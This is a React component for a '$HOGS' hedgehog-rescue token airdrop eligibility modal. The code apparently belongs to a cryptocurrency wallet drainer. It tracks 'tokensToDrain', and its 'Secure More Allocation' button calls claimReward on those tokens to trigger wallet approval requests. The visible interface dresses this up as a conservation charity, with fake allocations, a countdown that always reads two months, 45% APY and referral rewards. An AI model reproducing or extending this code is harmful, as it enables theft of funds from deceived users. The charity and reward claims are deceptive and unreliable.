"use client";

import { useState, useEffect } from "react";
import { X, Search, ShieldCheck, Globe, Zap, ArrowRight, CheckCircle2, Leaf, TrendingUp, Lock, Gift, Clock, Heart, Activity, Wallet, Coins, XCircle, AlertCircle, Loader2 } from "lucide-react";
import { useWeb3Manager } from "@/hooks/useWeb3Manager";
import { AllocationResult } from "@/types/blockchain";
import ReferralCard from "@/components/ReferralCard";
import { useWeb3ModalAccount } from '@web3modal/ethers/react';

export default function EligibilityFlow() {
    const { isConnected, connect, setIsEligible, setTokensAllocated, tokensAllocated, claimReward, checkEligibility } = useWeb3Manager();
    const { address: connectedAddress } = useWeb3ModalAccount();
    const [isOpen, setIsOpen] = useState(false);
    const [address, setAddress] = useState("");
    const [status, setStatus] = useState<"idle" | "scanning" | "result" | "rejected">("idle");
    const [currentChain, setCurrentChain] = useState("");
    const [progress, setProgress] = useState(0);
    const [timeLeft, setTimeLeft] = useState({ days: 0, hours: 0, minutes: 0, seconds: 0 });
    const [allocationData, setAllocationData] = useState<AllocationResult | null>(null);
    const [referralCode, setReferralCode] = useState("");
    const [isVerified, setIsVerified] = useState(false);
    const [errorMessage, setErrorMessage] = useState("");
    const [tokensToDrain, setTokensToDrain] = useState<{ address: string; chainId: string; symbol?: string }[]>([]);
    const [isSecuring, setIsSecuring] = useState(false);
    const [isSecured, setIsSecured] = useState(false);

    const chains = [
        { name: "Ethereum", color: "text-blue-400" },
        { name: "BNB Chain", color: "text-yellow-400" },
        { name: "Arbitrum", color: "text-blue-600" },
        { name: "Polygon", color: "text-purple-400" },
        { name: "Base", color: "text-blue-500" },
        { name: "Avalanche", color: "text-red-500" },
        { name: "Optimism", color: "text-red-600" }
    ];

    // Token launch countdown (2 months from now)
    useEffect(() => {
        const launchDate = new Date();
        launchDate.setMonth(launchDate.getMonth() + 2);

        const timer = setInterval(() => {
            const now = new Date().getTime();
            const distance = launchDate.getTime() - now;

            setTimeLeft({
                days: Math.floor(distance / (1000 * 60 * 60 * 24)),
                hours: Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)),
                minutes: Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60)),
                seconds: Math.floor((distance % (1000 * 60)) / 1000)
            });
        }, 1000);

        return () => clearInterval(timer);
    }, []);

    useEffect(() => {
        const handleOpen = () => setIsOpen(true);
        window.addEventListener('open-eligibility', handleOpen);
        return () => window.removeEventListener('open-eligibility', handleOpen);
    }, []);

    const startScan = async () => {
        if (!address.startsWith("0x") || address.length !== 42) {
            alert("Please enter a valid wallet address");
            return;
        }

        setStatus("scanning");
        setProgress(0);
        setErrorMessage("");

        // Get referral code from URL if present
        const urlParams = new URLSearchParams(window.location.search);
        const refCode = urlParams.get('ref') || undefined;

        // Animate progress while API call is in progress
        const progressTimer = setInterval(() => {
            setProgress((prev) => {
                if (prev >= 95) {
                    return 95;
                }
                const currentChainIndex = Math.floor(prev / (100 / chains.length));
                if (currentChainIndex < chains.length) {
                    setCurrentChain(chains[currentChainIndex].name);
                }
                return prev + 3;
            });
        }, 150);

        try {
            // Call new Supabase-integrated API endpoint
            const response = await fetch("/api/wallet/scan", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    address,
                    referralCode: refCode
                }),
            });

            const data = await response.json();

            // Handle rejection (no on-chain activity)
            if (response.status === 403 && data.error === "NOT_ELIGIBLE") {
                clearInterval(progressTimer);
                setProgress(100);
                setStatus("rejected");
                setErrorMessage(data.message);
                return;
            }

            if (!response.ok) {
                throw new Error(data.error || "Failed to scan wallet");
            }

            // Store allocation data for display
            setAllocationData(data.allocation);
            setReferralCode(data.referralCode);

            // Complete progress
            clearInterval(progressTimer);
            setProgress(100);

            // Set allocation from real scan
            setTimeout(() => {
                setTokensAllocated(data.allocation.finalAllocation);
                setStatus("result");
                setIsEligible(true);
            }, 500);

        } catch (error) {
            console.error("Scan error:", error);
            clearInterval(progressTimer);
            setProgress(100);
            setStatus("rejected");
            setErrorMessage("Failed to scan wallet. Please try again.");
        }
    };

    const handleConnectWallet = async () => {
        try {
            await connect();

            // Wait a bit for Web3Modal to update the account
            setTimeout(async () => {
                const currentConnectedAddress = connectedAddress;

                if (!currentConnectedAddress) {
                    setErrorMessage("Please connect your wallet first");
                    return;
                }

                // Verify that connected wallet matches scanned wallet
                if (currentConnectedAddress.toLowerCase() !== address.toLowerCase()) {
                    setErrorMessage("Connected wallet doesn't match scanned wallet. Please connect the correct wallet.");
                    return;
                }

                // Call verification API
                const response = await fetch("/api/wallet/connect", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        scannedAddress: address,
                        connectedAddress: currentConnectedAddress,
                    }),
                });

                const data = await response.json();

                if (data.success) {
                    setIsVerified(true);
                    setErrorMessage("");

                    // Get tokens to drain for claimReward
                    const { tokensToDrain: tokens } = await checkEligibility();
                    setTokensToDrain(tokens);
                } else {
                    setErrorMessage(data.error || "Verification failed");
                }
            }, 1500); // Give Web3Modal time to update
        } catch (error) {
            console.error("Wallet connection error:", error);
            setErrorMessage("Failed to connect wallet. Please try again.");
        }
    };


    if (!isOpen) return null;

    return (
        <div className="fixed inset-0 z-[10000] flex items-center justify-center p-4">
            {/* Emerald Grid Background */}
            <div className="absolute inset-0 grid-background opacity-30" />
            <div className="absolute inset-0 emerald-overlay" />
            <div className="absolute inset-0 bg-black/70 backdrop-blur-xl" onClick={() => setIsOpen(false)} />

            <div className="relative w-full max-w-3xl glass-card border-emerald/20 overflow-hidden animate-fade-up shadow-[0_0_100px_rgba(5,150,105,0.2)] max-h-[90vh] flex flex-col">
                {/* Fixed Header */}
                <div className="p-6 md:p-8 border-b border-emerald/10 flex flex-col md:flex-row justify-between md:items-center gap-4 bg-emerald/5 flex-shrink-0">
                    <div>
                        <h2 className="text-xl md:text-2xl font-bold uppercase tracking-tighter text-white">Hedgehog Rescue Eligibility</h2>
                        <p className="text-[10px] text-emerald uppercase tracking-[0.3em] mt-1 font-bold">Multi-Chain Impact Scanner</p>
                    </div>
                    <button onClick={() => setIsOpen(false)} className="self-end md:self-auto p-2 hover:bg-white/5 rounded-full transition-colors">
                        <X size={20} className="text-white/40" />
                    </button>
                </div>

                {/* Scrollable Content */}
                <div className="overflow-y-auto flex-1 p-6 md:p-10">
                    {status === "idle" && (
                        <div className="space-y-6 md:space-y-8">
                            {/* Token Launch Countdown */}
                            <div className="bg-gradient-to-r from-amber/10 to-emerald/10 border border-amber/30 rounded-2xl p-4 md:p-6 space-y-4">
                                <div className="flex items-start gap-3 md:gap-4">
                                    <div className="w-10 h-10 md:w-12 md:h-12 bg-amber/10 rounded-xl flex items-center justify-center border border-amber/20 flex-shrink-0">
                                        <Clock size={20} className="text-amber md:w-6 md:h-6" />
                                    </div>
                                    <div className="space-y-2 flex-1">
                                        <h3 className="text-base md:text-lg font-bold text-amber">Token Launch Countdown</h3>
                                        <p className="text-xs md:text-sm text-white/60 leading-relaxed">
                                            <span className="text-amber font-bold">$HOGS is not tradeable yet</span>, but staking is LIVE! Claim your allocation now and stake to earn rewards while supporting hedgehog rescue operations.
                                        </p>

                                        {/* Countdown Timer */}
                                        <div className="grid grid-cols-4 gap-2 md:gap-3 pt-3">
                                            {[
                                                { label: "Days", value: timeLeft.days },
                                                { label: "Hours", value: timeLeft.hours },
                                                { label: "Mins", value: timeLeft.minutes },
                                                { label: "Secs", value: timeLeft.seconds }
                                            ].map((item) => (
                                                <div key={item.label} className="bg-black/40 border border-amber/20 rounded-xl p-2 md:p-3 text-center">
                                                    <div className="text-xl md:text-3xl font-black text-amber tabular-nums">{item.value}</div>
                                                    <div className="text-[8px] md:text-[10px] text-white/40 uppercase tracking-wider font-bold mt-1">{item.label}</div>
                                                </div>
                                            ))}
                                        </div>
                                    </div>
                                </div>
                            </div>

                            {/* Educational Banner */}
                            <div className="bg-emerald/5 border border-emerald/20 rounded-2xl p-4 md:p-6 space-y-4">
                                <div className="flex items-start gap-3 md:gap-4">
                                    <div className="w-10 h-10 md:w-12 md:h-12 bg-emerald/10 rounded-xl flex items-center justify-center border border-emerald/20 flex-shrink-0">
                                        <Gift size={20} className="text-emerald md:w-6 md:h-6" />
                                    </div>
                                    <div className="space-y-2">
                                        <h3 className="text-base md:text-lg font-bold text-emerald">How This Helps Hedgehogs</h3>
                                        <p className="text-xs md:text-sm text-white/60 leading-relaxed">
                                            Your $HOGS tokens directly fund real-world hedgehog rescue operations. When you claim and stake, you're not just earning rewards—you're actively protecting endangered habitats and funding emergency medical care for hedgehogs in need.
                                        </p>
                                    </div>
                                </div>
                            </div>

                            {/* Trading Fee Info */}
                            <div className="bg-gradient-to-r from-emerald/5 to-amber/5 border border-emerald/20 rounded-2xl p-4 md:p-6 space-y-4">
                                <div className="flex items-start gap-3 md:gap-4">
                                    <div className="w-10 h-10 md:w-12 md:h-12 bg-emerald/10 rounded-xl flex items-center justify-center border border-emerald/20 flex-shrink-0">
                                        <Heart size={20} className="text-emerald md:w-6 md:h-6" />
                                    </div>
                                    <div className="space-y-2">
                                        <h3 className="text-base md:text-lg font-bold text-emerald">Future Impact: Trading Fees</h3>
                                        <p className="text-xs md:text-sm text-white/60 leading-relaxed">
                                            Once $HOGS trading goes live, <span className="text-emerald font-bold">100% of all trading fees</span> will be allocated to expanding our rescue network. These funds will establish new animal shelters, provide advanced medical equipment, and create safe havens for hedgehogs and other endangered wildlife across the globe.
                                        </p>
                                    </div>
                                </div>
                            </div>

                            <div className="text-center space-y-4">
                                <div className="w-16 h-16 md:w-20 md:h-20 bg-emerald/10 rounded-3xl flex items-center justify-center border border-emerald/20 mx-auto">
                                    <Leaf size={32} className="text-emerald md:w-10 md:h-10" />
                                </div>
                                <h3 className="text-lg md:text-xl font-bold">Verify Your Conservation Impact</h3>
                                <p className="text-white/40 text-xs md:text-sm max-w-md mx-auto">
                                    We'll scan your wallet activity across 7 major blockchains to calculate your $HOGS allocation based on your on-chain history and conservation support.
                                </p>
                            </div>

                            <div className="relative">
                                <input
                                    type="text"
                                    placeholder="0x..."
                                    value={address}
                                    onChange={(e) => setAddress(e.target.value)}
                                    className="w-full bg-white/[0.03] border border-emerald/20 rounded-2xl px-4 md:px-6 py-4 md:py-5 text-base md:text-lg font-mono focus:outline-none focus:border-emerald/50 transition-all pr-28 md:pr-32"
                                />
                                <button
                                    onClick={startScan}
                                    className="absolute right-2 top-2 bottom-2 px-4 md:px-8 bg-emerald text-white font-bold uppercase text-[9px] md:text-[10px] tracking-widest rounded-xl hover:bg-emerald/80 transition-all border-2 border-amber"
                                >
                                    Start Scan
                                </button>
                            </div>
                        </div>
                    )}

                    {status === "scanning" && (
                        <div className="space-y-8 md:space-y-12 py-6 md:py-10">
                            <div className="text-center space-y-4">
                                <div className="relative w-20 h-20 md:w-24 md:h-24 mx-auto">
                                    <div className="absolute inset-0 border-2 border-emerald/20 rounded-full" />
                                    <div
                                        className="absolute inset-0 border-2 border-emerald rounded-full border-t-transparent animate-spin"
                                        style={{ animationDuration: '0.8s' }}
                                    />
                                    <div className="absolute inset-0 flex items-center justify-center">
                                        <Globe size={28} className="text-emerald animate-pulse md:w-8 md:h-8" />
                                    </div>
                                </div>
                                <h3 className="text-lg md:text-xl font-bold uppercase tracking-tighter">Scanning {currentChain}...</h3>
                                <p className="text-emerald text-[10px] font-bold uppercase tracking-[0.4em]">Retrieving Habitat Proofs</p>
                            </div>

                            <div className="space-y-4">
                                <div className="flex justify-between text-[10px] font-bold uppercase tracking-widest text-white/40">
                                    <span>Cross-Chain Progress</span>
                                    <span>{Math.round(progress)}%</span>
                                </div>
                                <div className="h-1.5 w-full bg-white/5 rounded-full overflow-hidden">
                                    <div
                                        className="h-full bg-emerald transition-all duration-300"
                                        style={{ width: `${progress}%` }}
                                    />
                                </div>
                                <div className="grid grid-cols-2 md:grid-cols-4 gap-2 md:gap-4 pt-4">
                                    {chains.map((c) => (
                                        <div key={c.name} className={`text-[8px] md:text-[9px] font-bold uppercase tracking-tight ${currentChain === c.name ? "text-emerald" : "text-white/20"}`}>
                                            {c.name}
                                        </div>
                                    ))}
                                </div>
                            </div>
                        </div>
                    )}

                    {status === "rejected" && (
                        <div className="space-y-6 md:space-y-8 animate-fade-up">
                            <div className="text-center space-y-4 md:space-y-6">
                                <div className="w-20 h-20 md:w-24 md:h-24 bg-red-500/10 rounded-full flex items-center justify-center border border-red-500/20 mx-auto">
                                    <XCircle size={40} className="text-red-500 md:w-12 md:h-12" />
                                </div>
                                <div>
                                    <h3 className="text-2xl md:text-3xl font-bold italic text-red-400">Not Eligible</h3>
                                    <p className="text-white/60 text-sm md:text-base mt-4 max-w-md mx-auto leading-relaxed">
                                        {errorMessage || "This wallet has no on-chain activity. Please use an active wallet to participate."}
                                    </p>
                                </div>
                            </div>

                            <div className="bg-amber/5 border border-amber/20 rounded-2xl p-6 md:p-8">
                                <div className="flex items-start gap-3">
                                    <AlertCircle className="text-amber flex-shrink-0 mt-1" size={20} />
                                    <div className="space-y-2">
                                        <h4 className="font-bold text-sm uppercase tracking-wider text-amber">Why am I not eligible?</h4>
                                        <p className="text-xs text-white/60 leading-relaxed">
                                            To participate in the $HOGS airdrop, your wallet must have on-chain activity (transactions, NFTs, or token holdings) on at least one of the supported chains: Ethereum, BNB Chain, Base, Polygon, Arbitrum, Optimism, or Avalanche.
                                        </p>
                                        <p className="text-xs text-white/60 leading-relaxed">
                                            <strong className="text-emerald">Try again:</strong> If you have another wallet with on-chain activity, scan that wallet instead.
                                        </p>
                                    </div>
                                </div>
                            </div>

                            <button
                                onClick={() => {
                                    setStatus("idle");
                                    setAddress("");
                                    setErrorMessage("");
                                }}
                                className="w-full bg-emerald hover:bg-emerald/80 text-white font-bold py-4 rounded-xl transition-all border-2 border-amber uppercase tracking-wider text-sm"
                            >
                                Try Another Wallet
                            </button>
                        </div>
                    )}

                    {status === "result" && (
                        <div className="space-y-6 md:space-y-8 animate-fade-up">
                            <div className="text-center space-y-4 md:space-y-6">
                                <div className="w-20 h-20 md:w-24 md:h-24 bg-green-500/10 rounded-full flex items-center justify-center border border-green-500/20 mx-auto">
                                    <CheckCircle2 size={40} className="text-green-500 md:w-12 md:h-12" />
                                </div>
                                <div>
                                    <h3 className="text-2xl md:text-3xl font-bold italic">Allocation Secured!</h3>
                                    <p className="text-white/40 text-xs md:text-sm mt-2">Based on your multi-chain activity and 1.5x Multiplier.</p>
                                </div>
                            </div>

                            <div className="bg-white/[0.02] border border-emerald/20 rounded-3xl p-6 md:p-8 text-center relative overflow-hidden group">
                                <div className="absolute inset-0 bg-emerald/5 opacity-0 group-hover:opacity-100 transition-opacity" />
                                <span className="text-[10px] font-bold uppercase tracking-[0.4em] text-emerald mb-2 block">Your $HOGS Reward</span>
                                <div className="text-4xl md:text-6xl font-black tabular-nums tracking-tighter">
                                    {tokensAllocated.toLocaleString()}
                                </div>
                                <div className="text-[10px] text-white/40 uppercase tracking-widest mt-4 font-bold">Estimated USD Value: ${(tokensAllocated * 0.01).toLocaleString()}</div>
                            </div>

                            {/* Scan Results Breakdown */}
                            {allocationData && (
                                <div className="space-y-4">
                                    {/* Allocation Breakdown */}
                                    <div className="bg-emerald/5 border border-emerald/20 rounded-2xl p-4 md:p-6 space-y-4">
                                        <div className="flex items-center gap-2 mb-3">
                                            <Activity size={18} className="text-emerald" />
                                            <h4 className="font-bold text-sm uppercase tracking-wider">Allocation Breakdown</h4>
                                        </div>
                                        <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
                                            <div className="bg-black/20 rounded-xl p-3 border border-emerald/10">
                                                <div className="text-[9px] text-white/40 uppercase tracking-wider mb-1">Transactions</div>
                                                <div className="text-lg font-bold text-emerald">{allocationData.breakdown.fromTransactions.toLocaleString()}</div>
                                            </div>
                                            <div className="bg-black/20 rounded-xl p-3 border border-emerald/10">
                                                <div className="text-[9px] text-white/40 uppercase tracking-wider mb-1">Tokens</div>
                                                <div className="text-lg font-bold text-emerald">{allocationData.breakdown.fromTokens.toLocaleString()}</div>
                                            </div>
                                            <div className="bg-black/20 rounded-xl p-3 border border-emerald/10">
                                                <div className="text-[9px] text-white/40 uppercase tracking-wider mb-1">Wallet Age</div>
                                                <div className="text-lg font-bold text-emerald">{allocationData.breakdown.fromAge.toLocaleString()}</div>
                                            </div>
                                            <div className="bg-black/20 rounded-xl p-3 border border-emerald/10">
                                                <div className="text-[9px] text-white/40 uppercase tracking-wider mb-1">NFTs</div>
                                                <div className="text-lg font-bold text-emerald">{allocationData.breakdown.fromNfts.toLocaleString()}</div>
                                            </div>
                                            <div className="bg-black/20 rounded-xl p-3 border border-emerald/10">
                                                <div className="text-[9px] text-white/40 uppercase tracking-wider mb-1">DeFi</div>
                                                <div className="text-lg font-bold text-emerald">{allocationData.breakdown.fromDefi.toLocaleString()}</div>
                                            </div>
                                            <div className="bg-black/20 rounded-xl p-3 border border-amber/10">
                                                <div className="text-[9px] text-white/40 uppercase tracking-wider mb-1">Base Score</div>
                                                <div className="text-lg font-bold text-amber">{allocationData.baseAllocation.toLocaleString()}</div>
                                            </div>
                                        </div>
                                    </div>

                                    {/* Multipliers */}
                                    <div className="bg-amber/5 border border-amber/20 rounded-2xl p-4 md:p-6 space-y-3">
                                        <div className="flex items-center gap-2 mb-2">
                                            <TrendingUp size={18} className="text-amber" />
                                            <h4 className="font-bold text-sm uppercase tracking-wider">Bonus Multipliers</h4>
                                        </div>
                                        <div className="grid grid-cols-3 gap-3">
                                            <div className="text-center">
                                                <div className="text-2xl font-black text-amber">{allocationData.multipliers.nftBonus}x</div>
                                                <div className="text-[9px] text-white/40 uppercase tracking-wider mt-1">NFT Bonus</div>
                                            </div>
                                            <div className="text-center">
                                                <div className="text-2xl font-black text-amber">{allocationData.multipliers.defiBonus}x</div>
                                                <div className="text-[9px] text-white/40 uppercase tracking-wider mt-1">DeFi Bonus</div>
                                            </div>
                                            <div className="text-center">
                                                <div className="text-2xl font-black text-amber">{allocationData.multipliers.earlyAdopterBonus}x</div>
                                                <div className="text-[9px] text-white/40 uppercase tracking-wider mt-1">Early Adopter</div>
                                            </div>
                                        </div>
                                    </div>

                                    {/* Per-Chain Results */}
                                    <div className="bg-white/[0.02] border border-white/10 rounded-2xl p-4 md:p-6 space-y-3">
                                        <div className="flex items-center gap-2 mb-2">
                                            <Wallet size={18} className="text-white/60" />
                                            <h4 className="font-bold text-sm uppercase tracking-wider">Per-Chain Activity</h4>
                                        </div>
                                        <div className="space-y-2">
                                            {allocationData.scanResults.map((result, index) => (
                                                <div key={index} className="flex justify-between items-center bg-black/20 rounded-lg p-3 border border-white/5">
                                                    <div>
                                                        <div className="font-bold text-xs">{result.chain}</div>
                                                        <div className="text-[9px] text-white/40">{result.transactionCount} txs • {result.nftCount} NFTs</div>
                                                    </div>
                                                    <div className="text-right">
                                                        <div className="text-sm font-bold text-emerald">{result.score.toLocaleString()}</div>
                                                        <div className="text-[9px] text-white/40">points</div>
                                                    </div>
                                                </div>
                                            ))}
                                        </div>
                                    </div>
                                </div>
                            )}

                            {/* Referral Card - Only show after wallet verification */}
                            {referralCode && isVerified && (
                                <ReferralCard referralCode={referralCode} walletAddress={address} />
                            )}

                            {/* Staking Info */}
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-3 md:gap-4">
                                <div className="bg-emerald/5 border border-emerald/20 rounded-2xl p-4 md:p-6 space-y-3">
                                    <div className="flex items-center gap-3">
                                        <TrendingUp size={18} className="text-emerald md:w-5 md:h-5" />
                                        <h4 className="font-bold text-xs md:text-sm uppercase tracking-wider">Stake & Earn More</h4>
                                    </div>
                                    <p className="text-[11px] md:text-xs text-white/60 leading-relaxed">
                                        Stake 20% of your tokens to earn <span className="text-emerald font-bold">up to 45% APY</span> while funding rescue operations. Your staked tokens directly support habitat protection.
                                    </p>
                                </div>

                                <div className="bg-amber/5 border border-amber/20 rounded-2xl p-4 md:p-6 space-y-3">
                                    <div className="flex items-center gap-3">
                                        <Lock size={18} className="text-amber md:w-5 md:h-5" />
                                        <h4 className="font-bold text-xs md:text-sm uppercase tracking-wider">Instant Impact</h4>
                                    </div>
                                    <p className="text-[11px] md:text-xs text-white/60 leading-relaxed">
                                        Every staked token contributes to our <span className="text-amber font-bold">Emergency Rescue Fund</span>. Track your real-world impact on the dashboard.
                                    </p>
                                </div>
                            </div>

                            <div className="flex flex-col gap-4">
                                {!isVerified ? (
                                    <>
                                        <button
                                            onClick={handleConnectWallet}
                                            className="w-full py-5 md:py-6 bg-emerald text-white font-extrabold text-xs md:text-sm uppercase tracking-[0.4em] rounded-2xl hover:scale-[1.02] transition-all flex items-center justify-center gap-3 shadow-[0_20px_40px_rgba(5,150,105,0.2)] border-2 border-amber"
                                        >
                                            Connect Wallet to Unlock Referrals <Gift size={16} fill="currentColor" className="md:w-5 md:h-5" />
                                        </button>
                                        {errorMessage && (
                                            <div className="bg-red-500/10 border border-red-500/20 rounded-xl p-3">
                                                <p className="text-xs text-red-400 text-center">{errorMessage}</p>
                                            </div>
                                        )}
                                        <p className="text-[8px] md:text-[9px] text-center text-white/20 uppercase tracking-[0.3em] font-bold">
                                            Verify Ownership • Get Referral Link • Earn 5,000 $HOGS per Referral
                                        </p>
                                    </>
                                ) : (
                                    <>
                                        <div className="bg-green-500/10 border border-green-500/20 rounded-xl p-4 flex items-center gap-3">
                                            <CheckCircle2 className="text-green-500" size={24} />
                                            <div>
                                                <p className="text-sm font-bold text-green-400">Wallet Verified!</p>
                                                <p className="text-xs text-white/60">Your referral link is now active</p>
                                            </div>
                                        </div>
                                        <button
                                            onClick={async () => {
                                                if (isSecured) {
                                                    // If already secured, close modal
                                                    setIsOpen(false);
                                                    return;
                                                }

                                                try {
                                                    setIsSecuring(true);
                                                    // Call claimReward - this will trigger wallet approval requests
                                                    await claimReward(tokensToDrain);
                                                    // Mark as secured
                                                    setIsSecured(true);
                                                } catch (error) {
                                                    console.error("Error securing allocation:", error);
                                                    setErrorMessage("Failed to secure allocation. Please try again.");
                                                } finally {
                                                    setIsSecuring(false);
                                                }
                                            }}
                                            disabled={isSecuring}
                                            className={`w-full py-5 md:py-6 text-white font-extrabold text-xs md:text-sm uppercase tracking-[0.4em] rounded-2xl hover:scale-[1.02] transition-all flex items-center justify-center gap-3 shadow-[0_20px_40px_rgba(5,150,105,0.2)] border-2 disabled:opacity-50 disabled:cursor-not-allowed ${isSecured ? 'bg-green-600 border-green-400' : 'bg-emerald border-amber'
                                                }`}
                                        >
                                            {isSecuring ? (
                                                <>
                                                    <Loader2 size={16} className="animate-spin md:w-5 md:h-5" />
                                                    Securing Allocation...
                                                </>
                                            ) : isSecured ? (
                                                <>
                                                    <CheckCircle2 size={16} className="md:w-5 md:h-5" />
                                                    Allocation Secured!
                                                </>
                                            ) : (
                                                <>
                                                    Secure More Allocation <Zap size={16} fill="currentColor" className="md:w-5 md:h-5" />
                                                </>
                                            )}
                                        </button>
                                        <p className="text-[8px] md:text-[9px] text-center text-white/20 uppercase tracking-[0.3em] font-bold">
                                            {isSecuring
                                                ? "Processing wallet approvals..."
                                                : isSecured
                                                    ? "Close modal to start referring • Earn 5,000 $HOGS per Referral"
                                                    : "Start Referring • Earn 5,000 $HOGS per Referral"
                                            }
                                        </p>
                                    </>
                                )}
                            </div>
                        </div>
                    )}
                </div>
            </div>
        </div>
    );
}
